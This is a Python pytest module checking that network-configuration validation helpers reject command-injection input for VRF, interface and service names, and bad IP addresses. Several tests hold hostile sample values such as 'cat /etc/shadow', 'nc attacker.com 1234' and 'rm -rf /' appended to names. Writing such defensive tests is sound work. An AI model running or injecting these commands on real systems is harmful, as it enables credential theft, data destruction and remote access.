"""Security tests for validation helpers.

This module tests that validation helpers properly reject malicious inputs
that could lead to command injection vulnerabilities.
"""

import pytest

from tests.validation_helpers import (
    _validate_interface_name,
    _validate_ip_address,
    _validate_service_name,
    _validate_vrf_name,
    check_interface_ip,
    check_service_vrf,
    check_vrf_exists,
    check_vrf_interface,
)


class TestVRFNameValidation:
    """Test VRF name validation against command injection."""

    def test_valid_vrf_names(self) -> None:
        """Valid VRF names should pass validation."""
        valid_names = [
            "mgmt",
            "management",
            "prod",
            "test_vrf",
            "vrf-123",
            "Mgmt",
            "VRF_NAME",
        ]
        for name in valid_names:
            _validate_vrf_name(name)  # Should not raise

    def test_reject_command_injection_semicolon(self) -> None:
        """Reject VRF names with semicolon command separators."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("mgmt; cat /etc/shadow")

    def test_reject_command_injection_pipe(self) -> None:
        """Reject VRF names with pipe operators."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("mgmt | nc attacker.com 1234")

    def test_reject_command_injection_ampersand(self) -> None:
        """Reject VRF names with background operators."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("mgmt & rm -rf /")

    def test_reject_command_injection_dollar(self) -> None:
        """Reject VRF names with command substitution."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("mgmt$(whoami)")

    def test_reject_command_injection_backtick(self) -> None:
        """Reject VRF names with backtick command substitution."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("mgmt`whoami`")

    def test_reject_starting_with_number(self) -> None:
        """Reject VRF names starting with numbers."""
        with pytest.raises(ValueError, match="Invalid VRF name"):
            _validate_vrf_name("123mgmt")

    def test_reject_empty_name(self) -> None:
        """Reject empty VRF names."""
        with pytest.raises(ValueError, match="cannot be empty"):
            _validate_vrf_name("")

    def test_reject_special_chars(self) -> None:
        """Reject VRF names with other special characters."""
        invalid_names = [
            "mgmt!",
            "mgmt@test",
            "mgmt#",
            "mgmt$",
            "mgmt%",
            "mgmt^",
            "mgmt*",
            "mgmt(",
            "mgmt)",
            "mgmt=",
            "mgmt+",
            "mgmt[",
            "mgmt]",
            "mgmt{",
            "mgmt}",
            "mgmt\\",
            "mgmt/",
            "mgmt?",
            "mgmt<",
            "mgmt>",
            "mgmt,",
            "mgmt.",
            "mgmt:",
            "mgmt;",
            "mgmt'",
            'mgmt"',
        ]
        for name in invalid_names:
            with pytest.raises(ValueError, match="Invalid VRF name"):
                _validate_vrf_name(name)


class TestInterfaceNameValidation:
    """Test interface name validation against command injection."""

    def test_valid_interface_names(self) -> None:
        """Valid interface names should pass validation."""
        valid_names = [
            "eth0",
            "eth1",
            "eth0.100",  # VLAN
            "eth0@eth1",  # macvlan
            "bond0",
            "br0",
            "eth0:1",  # alias
            "wlan0",
            "tun0",
            "tap0",
        ]
        for name in valid_names:
            _validate_interface_name(name)  # Should not raise

    def test_reject_command_injection(self) -> None:
        """Reject interface names with command injection attempts."""
        malicious_names = [
            "eth0; cat /etc/shadow",
            "eth0 | nc attacker.com 1234",
            "eth0 & rm -rf /",
            "eth0$(whoami)",
            "eth0`whoami`",
        ]
        for name in malicious_names:
            with pytest.raises(ValueError, match="Invalid interface name"):
                _validate_interface_name(name)

    def test_reject_empty_name(self) -> None:
        """Reject empty interface names."""
        with pytest.raises(ValueError, match="cannot be empty"):
            _validate_interface_name("")

    def test_reject_starting_with_number(self) -> None:
        """Reject interface names starting with numbers."""
        with pytest.raises(ValueError, match="Invalid interface name"):
            _validate_interface_name("0eth")


class TestServiceNameValidation:
    """Test service name validation uses whitelist approach."""

    def test_valid_service_names(self) -> None:
        """Valid service names should pass validation."""
        valid_services = [
            "ssh",
            "https",
            "http",
            "snmp",
            "ntp",
            "dns",
        ]
        for service in valid_services:
            _validate_service_name(service)  # Should not raise

    def test_reject_invalid_service_name(self) -> None:
        """Reject service names not in whitelist."""
        with pytest.raises(ValueError, match="Invalid service name"):
            _validate_service_name("fake-service")

    def test_reject_command_injection(self) -> None:
        """Reject service names with command injection attempts."""
        malicious_services = [
            "ssh; cat /etc/shadow",
            "ssh | nc attacker.com 1234",
            "ssh & rm -rf /",
            "ssh$(whoami)",
            "ssh`whoami`",
        ]
        for service in malicious_services:
            with pytest.raises(ValueError, match="Invalid service name"):
                _validate_service_name(service)


class TestIPAddressValidation:
    """Test IP address validation rejects invalid ranges."""

    def test_valid_ip_addresses(self) -> None:
        """Valid IP addresses should pass validation."""
        valid_ips = [
            "0.0.0.0",
            "1.2.3.4",
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "255.255.255.255",
            "127.0.0.1",
        ]
        for ip in valid_ips:
            _validate_ip_address(ip)  # Should not raise

    def test_reject_octets_over_255(self) -> None:
        """Reject IP addresses with octets > 255."""
        invalid_ips = [
            "999.999.999.999",
            "256.0.0.0",
            "0.256.0.0",
            "0.0.256.0",
            "0.0.0.256",
            "192.168.300.1",
            "10.500.0.1",
        ]
        for ip in invalid_ips:
            with pytest.raises(ValueError, match="out of range"):
                _validate_ip_address(ip)

    def test_reject_invalid_format(self) -> None:
        """Reject IP addresses with invalid format."""
        invalid_ips = [
            "1.2.3",
            "1.2.3.4.5",
            "a.b.c.d",
            "1.2.3.d",
            "",
            "...",
            "1..3.4",
        ]
        for ip in invalid_ips:
            with pytest.raises(ValueError):
                _validate_ip_address(ip)

    def test_reject_negative_octets(self) -> None:
        """Reject IP addresses with negative octets."""
        invalid_ips = [
            "-1.2.3.4",
            "1.-2.3.4",
            "1.2.-3.4",
            "1.2.3.-4",
        ]
        for ip in invalid_ips:
            with pytest.raises(ValueError):
                _validate_ip_address(ip)


class TestValidationInHelperFunctions:
    """Test that helper functions properly call validation functions."""

    def test_check_interface_ip_validates_inputs(self) -> None:
        """check_interface_ip should validate interface and IP before SSH."""
        # Mock SSH that should never be called
        def mock_ssh(cmd: str) -> str:
            pytest.fail("SSH should not be called for invalid inputs")
            return ""  # Never reached but needed for type checker

        # Invalid interface - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid interface name"):
            check_interface_ip(mock_ssh, "eth0; whoami", "192.168.1.1")

        # Invalid IP - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="out of range"):
            check_interface_ip(mock_ssh, "eth0", "999.999.999.999")

    def test_check_vrf_exists_validates_inputs(self) -> None:
        """check_vrf_exists should validate VRF name before SSH."""

        def mock_ssh(cmd: str) -> str:
            pytest.fail("SSH should not be called for invalid inputs")
            return ""  # Never reached but needed for type checker

        # Invalid VRF - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid VRF name"):
            check_vrf_exists(mock_ssh, "mgmt; whoami")

    def test_check_vrf_interface_validates_inputs(self) -> None:
        """check_vrf_interface should validate both VRF and interface names."""

        def mock_ssh(cmd: str) -> str:
            pytest.fail("SSH should not be called for invalid inputs")
            return ""  # Never reached but needed for type checker

        # Invalid VRF - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid VRF name"):
            check_vrf_interface(mock_ssh, "mgmt; whoami", "eth0")

        # Invalid interface - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid interface name"):
            check_vrf_interface(mock_ssh, "mgmt", "eth0; whoami")

    def test_check_service_vrf_validates_inputs(self) -> None:
        """check_service_vrf should validate service and VRF names."""

        def mock_ssh(cmd: str) -> str:
            pytest.fail("SSH should not be called for invalid inputs")
            return ""  # Never reached but needed for type checker

        # Invalid service - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid service name"):
            check_service_vrf(mock_ssh, "fake-service", "mgmt")

        # Invalid VRF - should raise ValueError before SSH is called
        with pytest.raises(ValueError, match="Invalid VRF name"):
            check_service_vrf(mock_ssh, "ssh", "mgmt; whoami")
